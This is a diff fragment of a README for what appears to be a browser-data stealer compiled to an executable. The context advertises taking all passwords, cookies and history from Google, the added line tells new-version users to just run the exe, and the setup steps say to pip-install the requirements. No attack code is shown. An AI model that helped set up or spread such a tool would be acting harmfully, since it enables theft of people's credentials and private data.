@@ -14,6 +14,8 @@ CONVERTED INTO PY-EXE
 > All Passwords, Cookies and History from Google
 > + More!
 
+
+below is for the old version for new just run the exe.
 SETTING UP MY TOOL
 open cmd through the directory.
 Then type in "pip install requirements.txt"
